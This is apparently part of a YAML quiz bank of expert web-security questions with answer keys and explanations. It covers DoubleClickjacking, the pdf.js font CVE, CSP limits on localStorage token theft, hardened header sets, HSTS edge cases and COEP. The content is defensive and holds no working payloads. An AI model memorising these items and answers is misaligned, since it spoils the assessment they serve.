  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"

- id: xss-csp-and-security-headers-086
  difficulty: expert
  tags: [doubleclickjacking, clickjacking]
  question: |
    Why does "DoubleClickjacking" (2024) bypass both `frame-ancestors`/X-Frame-Options AND
    SameSite cookies?
  options:
  - "It injects a crafted directive into the response's Content-Security-Policy header that strips out both frame-ancestors and the SameSite cookie flag"
  - "It captures and replays the anti-CSRF token during the brief interval between the two clicks, defeating SameSite by forging a valid same-site request"
  - "The victim's second click lands on a top-level, unframed, same-site authenticated window swapped in between mousedown/mouseup, so framing headers and SameSite never engage"
  - "It only succeeds against sites that have not deployed HSTS, because the missing transport policy is what lets the attacker frame the authenticated page"
  answer: 2
  explanation: |
    DoubleClickjacking uses double-click/window-swap timing so the sensitive action occurs in
    a top-level (not iframed), same-site window that is already authenticated. Since there is
    no cross-site framing and no cross-site request, frame-ancestors and SameSite don't apply.
    Defenses: delay/disable critical buttons after focus, require explicit confirmation, use
    COOP.
  ref: "concepts.md#doubleclickjacking-and-the-limits-of-framing-defenses"

- id: xss-csp-and-security-headers-087
  difficulty: expert
  tags: [cve, supply-chain, pdfjs]
  question: |
    CVE-2024-4367 in Mozilla's pdf.js allowed arbitrary JavaScript execution via a crafted
    font. What broader lesson does it illustrate for appsec?
  options:
  - "PDF documents are always safe to render inline in the browser because the format has no mechanism to carry or trigger executable code"
  - "A correctly configured Content-Security-Policy fully prevents every vulnerability in third-party rendering libraries you embed in your origin"
  - "Font files are pure glyph data and cannot contain executable logic, so a malformed font can never lead to script execution in the page"
  - "Second-order/supply-chain XSS: a flaw in an embedded rendering library becomes XSS in your origin, so dependency patching and scanning are the control"
  answer: 3
  explanation: |
    A missing type check in an embedded library (pdf.js) executed attacker JS in the
    embedding origin — XSS you didn't write. The takeaway is that third-party/embedded code is
    part of your attack surface; keep dependencies patched and scanned (and sandbox untrusted
    rendering).
  ref: "concepts.md#notable-cves-and-incidents"

- id: xss-csp-and-security-headers-088
  difficulty: expert
  tags: [csp, localstorage, limits]
  question: |
    A React SPA enforces strict nonce CSP but stores a bearer token in localStorage. A
    DOM-XSS bug is found. Does CSP prevent the token from being stolen?
  options:
  - "Yes — a strict nonce CSP sandboxes same-origin script so it can no longer read the localStorage key holding the bearer token"
  - "Yes — the per-response CSP nonce is used as a key to transparently encrypt every localStorage entry against script reads"
  - "No — CSP restricts script sources/execution, not DOM reads of same-origin localStorage; you'd need Trusted Types to close the DOM sink, and connect-src 'self' won't stop exfil via your own origin/open redirect/gadget"
  - "No, but only because a token in a SPA is ineligible for the HttpOnly flag, which is the single control that would have blocked the read"
  answer: 2
  explanation: |
    CSP governs what scripts run and load, not what already-running same-origin code reads
    from localStorage. DOM-XSS can read the token; closing DOM sinks needs Trusted Types, and
    connect-src 'self' can be bypassed via same-origin gadgets/open redirects. This is the
    core HttpOnly-cookie vs localStorage-token argument.
  ref: "concepts.md#notable-cves-and-incidents"

- id: xss-csp-and-security-headers-089
  difficulty: expert
  tags: [headers, hardening, scenario]
  question: |
    Which header set best matches a fully-hardened 2025 app that also needs cross-origin
    isolation?
  options:
  - "script-src 'unsafe-inline'; X-Frame-Options: ALLOW-FROM *; Referrer-Policy: unsafe-url; Strict-Transport-Security: max-age=300; Permissions-Policy: geolocation=*"
  - "CSP nonce + 'strict-dynamic' + object-src 'none' + base-uri 'none' + frame-ancestors 'none' + require-trusted-types-for 'script'; HSTS preload; nosniff; Referrer-Policy: strict-origin-when-cross-origin; COOP same-origin + COEP require-corp; Permissions-Policy deny-list; Reporting-Endpoints + report-to"
  - "default-src *; Strict-Transport-Security: max-age=0; Permissions-Policy: camera=*; script-src * 'unsafe-eval'; X-Frame-Options: ALLOWALL; Referrer-Policy: no-referrer-when-downgrade"
  - "Only Content-Security-Policy: default-src 'self' with no HSTS, no Trusted Types, and no cross-origin isolation headers of any kind set on the response"
  answer: 1
  explanation: |
    The strong baseline: strict nonce + strict-dynamic CSP with object-src/base-uri/
    frame-ancestors 'none' and Trusted Types; HSTS preload; nosniff; a tight Referrer-Policy;
    COOP+COEP for isolation; a deny-list Permissions-Policy; and modern reporting. The other
    options rely on unsafe-inline, wildcards, ALLOW-FROM, or max-age=0 (which unsets HSTS).
  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"

- id: xss-csp-and-security-headers-090
  difficulty: expert
  tags: [correct-fix, scenario]
  question: |
    Match each case to the correct primary defense: (a) a search term reflected into the
    HTML body, (b) a WYSIWYG rich-text bio, (c) a #hash value assigned to innerHTML.
  options:
  - "(a) sanitize with DOMPurify, (b) output-encode, (c) block-list the hash"
  - "(a) context-aware output encoding, (b) HTML sanitization (+ Trusted Types), (c) use a safe sink like textContent (+ Trusted Types)"
  - "(a) Trusted Types only, (b) URL-encode, (c) server-side encoding"
  - "(a) input length limit, (b) CSP nonce, (c) HttpOnly cookie"
  answer: 1
  explanation: |
    (a) A reflected plain-text value needs context-aware output encoding. (b) Rich text that
    must contain HTML needs sanitization (DOMPurify), ideally wired to Trusted Types. (c) A
    client-side hash→sink flow is fixed by using a safe sink (textContent) or sanitizing,
    enforced by Trusted Types — server encoding can't help since the fragment never reaches
    the server.
  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"

- id: xss-csp-and-security-headers-091
  difficulty: advanced
  tags: [hsts, edge-cases]
  question: |
    Which statement about HSTS edge cases is CORRECT?
  options:
  - "HSTS guarantees cookie integrity, so a network attacker who controls a sibling subdomain can no longer set a forged cookie the parent domain will honor"
  - "Removing a domain from the HSTS preload list takes effect instantly and propagates to every installed browser within minutes of the request"
  - "includeSubDomains can amplify a subdomain-takeover risk, HSTS does not prevent cookie-integrity attacks from a subdomain, and max-age=0 unsets the policy"
  - "The Strict-Transport-Security header is honored even when it arrives over a plain HTTP response, installing the policy on the first cleartext visit"
  answer: 2
  explanation: |
    HSTS protects transport confidentiality/integrity of the connection but not cookie
    integrity — a network attacker controlling a subdomain can still set cookies on the parent.
    includeSubDomains widens exposure to subdomain takeover, preload removal takes months, and
    max-age=0 clears the stored policy. HSTS is ignored over plain HTTP.
  ref: "concepts.md#hsts-and-preload"

- id: xss-csp-and-security-headers-092
  difficulty: advanced
  tags: [coep, credentialless]
  question: |
    Under `Cross-Origin-Embedder-Policy: require-corp`, what must a cross-origin subresource
    do to be embeddable?
  options:
  - "Nothing extra is required; require-corp permits every cross-origin subresource to load exactly as before"
  - "Be served over an HTTP/3 (QUIC) connection so the browser can verify its transport-layer origin first"
  - "Explicitly opt in via CORP (Cross-Origin-Resource-Policy) or CORS; otherwise the browser blocks it"
  - "Include an X-Frame-Options: ALLOWALL header so the embedder is added to its framing allowlist"
  answer: 2
  explanation: |
    COEP: require-corp forces every cross-origin subresource to opt in — via a CORP header
    (e.g. cross-origin) or CORS — or it is blocked. This opt-in requirement is what makes
    cross-origin isolation safe. The `credentialless` variant instead loads such resources
    without credentials.
  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
